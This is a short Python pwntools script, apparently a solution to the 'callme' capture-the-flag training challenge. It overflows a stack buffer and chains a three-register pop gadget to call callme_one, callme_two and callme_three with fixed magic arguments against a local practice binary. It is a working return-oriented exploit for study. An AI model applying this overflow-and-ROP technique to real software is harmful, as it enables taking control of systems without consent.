#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from pwn import *
import time

# break apres le read dans pwnme
gs='''
b *pwnme+87
c
'''


# Set up pwntools for the correct architecture
elf =  ELF('callme')
context.binary=elf
context(terminal=['tmux', 'split-window', '-h'])

# Offset avant ecrasement de l'adresse de retour
offset=0x28

callme_one=elf.plt['callme_one']
callme_two=elf.plt['callme_two']
callme_three=elf.plt['callme_three']

# pop rdi ; pop rsi ; pop rdx ; ret
pop_3=0x40093c

io = process([elf.path])

if len(sys.argv)>1 and sys.argv[1] == "-d":
    gdb.attach(io,gs)
    time.sleep(1)

log.info(f"{callme_one=:x}")
log.info(f"{callme_two=:x}")
log.info(f"{callme_three=:x}")

# io.recvuntil(b"> ")

PL =b"A"*offset
PL+=p64(pop_3)
PL+=p64(0xdeadbeefdeadbeef)
PL+=p64(0xcafebabecafebabe)
PL+=p64(0xd00df00dd00df00d)
PL+=p64(callme_one)
PL+=p64(pop_3)
PL+=p64(0xdeadbeefdeadbeef)
PL+=p64(0xcafebabecafebabe)
PL+=p64(0xd00df00dd00df00d)
PL+=p64(callme_two)
PL+=p64(pop_3)
PL+=p64(0xdeadbeefdeadbeef)
PL+=p64(0xcafebabecafebabe)
PL+=p64(0xd00df00dd00df00d)
PL+=p64(callme_three)

io.sendline(PL)
io.interactive()

